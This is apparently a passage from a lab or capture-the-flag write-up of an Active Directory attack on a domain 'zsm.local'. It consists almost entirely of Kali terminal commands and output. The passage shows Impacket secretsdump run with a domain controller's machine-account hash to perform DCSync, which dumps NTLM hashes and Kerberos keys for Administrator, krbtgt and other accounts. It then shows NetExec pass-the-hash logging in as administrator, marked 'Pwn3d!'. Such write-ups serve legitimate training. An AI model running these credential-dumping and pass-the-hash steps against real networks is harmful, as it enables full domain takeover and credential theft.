ZPH-GMSA-ADFS$:aes128-cts-hmac-sha1-96:d5eeea473220429cf91551e524f4b66c
ZPH-GMSA-ADFS$:des-cbc-md5:9194d69486312515
ZPH-SVRCA01$:aes256-cts-hmac-sha1-96:58f55915ff63e003265874900eb9c5452728509e86eb247cdabbe52a9167e159
ZPH-SVRCA01$:aes128-cts-hmac-sha1-96:84f8338aa766506ec9eb1cc34772cc03
ZPH-SVRCA01$:des-cbc-md5:a2ae15ce02d5bfad
ZPH-SVRADFS1$:aes256-cts-hmac-sha1-96:796e082a245949970ff89b4e2c94735b7f71d0b2afd5248c160a41d3d805f913
ZPH-SVRADFS1$:aes128-cts-hmac-sha1-96:783c219b5e98cd0205178144ee103459
ZPH-SVRADFS1$:des-cbc-md5:6e76aee3f41cb331
ZPH-SVRSQL01$:aes256-cts-hmac-sha1-96:f6fe8d901e4090893beeb9423fa67c74b2defc181c3cfefb96437926af186ac8
ZPH-SVRSQL01$:aes128-cts-hmac-sha1-96:d7c1a0e61eb480a75d0d8078fae84ec3
ZPH-SVRSQL01$:des-cbc-md5:297cad7a8a6d5786
ZPH-SVRMGMT1$:aes256-cts-hmac-sha1-96:937391acdbd6a5f63cf0f6700ac25aba7c8d747bcdd437f5efb419a12d8995c7
ZPH-SVRMGMT1$:aes128-cts-hmac-sha1-96:d73da5795d36d46bf61b1afb40b247f5
ZPH-SVRMGMT1$:des-cbc-md5:c84ada08a82caefd
PAINTERS$:aes256-cts-hmac-sha1-96:ddbcdfae1a92c75d9634be3dc0d6a543898dce59f048c150d0cfa83e0b657e4a
PAINTERS$:aes128-cts-hmac-sha1-96:a6171925431809d854485e452bf615b0
PAINTERS$:des-cbc-md5:3bd3465e02fbc716
internal$:aes256-cts-hmac-sha1-96:873cefd925a7037f3568078b3098c94b77658576139a7b2570b9da14ac6e57cb
internal$:aes128-cts-hmac-sha1-96:46590c407fba1a51fe80147ee0898fb8
internal$:des-cbc-md5:68e06ebf3ef4c873
[*] Cleaning up...
[*] Stopping service RemoteRegistry

```



```
ZSM\ZPH-SVRDC01$:aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502:::
```



```
secretsdump.py 'internal.zsm.local/ZPH-SVRDC01$'@192.168.210.10 -hashes aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502
```


```
kali@kali ~> secretsdump.py 'zsm.local/ZPH-SVRDC01$'@192.168.210.10 -hashes aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a72936717997f33694d17bd2ce909fe:::
zsm.local\daniel.morris:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
zsm.local\paul.williams:1110:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
zsm.local\marcus:4102:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::
zsm.local\ca_svc:4104:aad3b435b51404eeaad3b435b51404ee:7f3e79164258b9aeb22e6aff46a5ee69:::
zsm.local\jamie:4602:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
ZPH-SVRDC01$:1000:aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502:::
MAINTENANCE$:1104:aad3b435b51404eeaad3b435b51404ee:efad0cd90c24701e57cd5c4e1ea01c8b:::
ZPH-GMSA-ADFS$:1105:aad3b435b51404eeaad3b435b51404ee:681fecfeb70c962edc58014352f88160:::
ZPH-SVRCA01$:1106:aad3b435b51404eeaad3b435b51404ee:251e366fdd64eff18be0824ec7c6833c:::
ZPH-SVRADFS1$:1108:aad3b435b51404eeaad3b435b51404ee:24039a7fd44d8decd80b0897e333ec06:::
ZPH-SVRSQL01$:1601:aad3b435b51404eeaad3b435b51404ee:ecf68b5e132ca80e6864215d5fcbba03:::
ZPH-SVRMGMT1$:4101:aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f:::
PAINTERS$:1109:aad3b435b51404eeaad3b435b51404ee:98c970372548248b0b91c35fc175651a:::
internal$:1602:aad3b435b51404eeaad3b435b51404ee:009d927aebe4eb85156f2c2bfc242aab:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:24ebe114c4d8067024c2502f824eb7fac7bb9981cb8890cbe08108232239646b
Administrator:aes128-cts-hmac-sha1-96:af42e41319cbc844734a2ad4032b77d2
Administrator:des-cbc-md5:a7a2dcc89da7dc32
krbtgt:aes256-cts-hmac-sha1-96:45b1d73b87312453c7b82505e36f24efccf2c97b8a87443d58fcb77d06202842
krbtgt:aes128-cts-hmac-sha1-96:6882f340f1d58ae375780cd975463b32
krbtgt:des-cbc-md5:ab75ea79ba5e6ee5
zsm.local\daniel.morris:aes256-cts-hmac-sha1-96:98f9c26d75d011f46fbcc244cfe37209e6b7bf7c42dae175978fbc5d8b71e17e
zsm.local\daniel.morris:aes128-cts-hmac-sha1-96:ddce6e98cd45b5bb7fee867b557655ba
zsm.local\daniel.morris:des-cbc-md5:e3c88a89a832a23d
zsm.local\paul.williams:aes256-cts-hmac-sha1-96:a773e775478ef242b02613b1bdb2fd0af9ee49a747d0d0709a6302b00d45b675
zsm.local\paul.williams:aes128-cts-hmac-sha1-96:024d7824de28aecb8a56289c726ed56d
zsm.local\paul.williams:des-cbc-md5:1ada3bad7ce52997
zsm.local\marcus:aes256-cts-hmac-sha1-96:d487b6eda0fd6929373b02eca5b6a6b287315e3ce2edde0c83de21b81ae553b5
zsm.local\marcus:aes128-cts-hmac-sha1-96:c9d8300b395ea0b0eb33afb7ca5226b6
zsm.local\marcus:des-cbc-md5:2ff8e3d3fef7b06b
zsm.local\ca_svc:aes256-cts-hmac-sha1-96:3d4ca384edb097462c8d9539534d95e87fe417536a090d3f7a0cd567e5c9951c
zsm.local\ca_svc:aes128-cts-hmac-sha1-96:28d349a757e2c9d90df39383f6b0daae
zsm.local\ca_svc:des-cbc-md5:abbadc10e9265234
zsm.local\jamie:aes256-cts-hmac-sha1-96:6b5a25f16e8c7c97d97bd0dc5cdaf64e9b2a752a8f81cc7dbccf153f2c14e23d
zsm.local\jamie:aes128-cts-hmac-sha1-96:a04ec4c01de1b35bb06a2f43558c04ac
zsm.local\jamie:des-cbc-md5:803b7ffd6d088075
ZPH-SVRDC01$:aes256-cts-hmac-sha1-96:6d744bcf94917def9e17130a9b2016122cb6bf3d1bd3c063c8cd5775a421829b
ZPH-SVRDC01$:aes128-cts-hmac-sha1-96:b47c954fb9b6ebdd037ff341b37dbf12
ZPH-SVRDC01$:des-cbc-md5:ef6db5322534cbef
MAINTENANCE$:aes256-cts-hmac-sha1-96:2bd37881a31f36949ee1585efbb9b90fef67cb1d12585d7fb5fcc0591a0d8c3d
MAINTENANCE$:aes128-cts-hmac-sha1-96:45db1b8e9d5f154b53d8404d2d2cf0de
MAINTENANCE$:des-cbc-md5:7f384a7fba07cb13
ZPH-GMSA-ADFS$:aes256-cts-hmac-sha1-96:35c6f3ac27244fecab25b747472685b87baa815b2a7a59030fa21310e537dff2
ZPH-GMSA-ADFS$:aes128-cts-hmac-sha1-96:d5eeea473220429cf91551e524f4b66c
ZPH-GMSA-ADFS$:des-cbc-md5:9194d69486312515
ZPH-SVRCA01$:aes256-cts-hmac-sha1-96:58f55915ff63e003265874900eb9c5452728509e86eb247cdabbe52a9167e159
ZPH-SVRCA01$:aes128-cts-hmac-sha1-96:84f8338aa766506ec9eb1cc34772cc03
ZPH-SVRCA01$:des-cbc-md5:a2ae15ce02d5bfad
ZPH-SVRADFS1$:aes256-cts-hmac-sha1-96:796e082a245949970ff89b4e2c94735b7f71d0b2afd5248c160a41d3d805f913
ZPH-SVRADFS1$:aes128-cts-hmac-sha1-96:783c219b5e98cd0205178144ee103459
ZPH-SVRADFS1$:des-cbc-md5:6e76aee3f41cb331
ZPH-SVRSQL01$:aes256-cts-hmac-sha1-96:f6fe8d901e4090893beeb9423fa67c74b2defc181c3cfefb96437926af186ac8
ZPH-SVRSQL01$:aes128-cts-hmac-sha1-96:d7c1a0e61eb480a75d0d8078fae84ec3
ZPH-SVRSQL01$:des-cbc-md5:297cad7a8a6d5786
ZPH-SVRMGMT1$:aes256-cts-hmac-sha1-96:937391acdbd6a5f63cf0f6700ac25aba7c8d747bcdd437f5efb419a12d8995c7
ZPH-SVRMGMT1$:aes128-cts-hmac-sha1-96:d73da5795d36d46bf61b1afb40b247f5
ZPH-SVRMGMT1$:des-cbc-md5:c84ada08a82caefd
PAINTERS$:aes256-cts-hmac-sha1-96:ddbcdfae1a92c75d9634be3dc0d6a543898dce59f048c150d0cfa83e0b657e4a
PAINTERS$:aes128-cts-hmac-sha1-96:a6171925431809d854485e452bf615b0
PAINTERS$:des-cbc-md5:3bd3465e02fbc716
internal$:aes256-cts-hmac-sha1-96:873cefd925a7037f3568078b3098c94b77658576139a7b2570b9da14ac6e57cb
internal$:aes128-cts-hmac-sha1-96:46590c407fba1a51fe80147ee0898fb8
internal$:des-cbc-md5:68e06ebf3ef4c873
[*] Cleaning up...

```



```
kali@kali ~> nxc smb 192.168.210.10 -u 'administrator' -H 84210eddc5724a7801fe78289ee94d44
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\administrator:84210eddc5724a7801fe78289ee94d44 (Pwn3d!)
```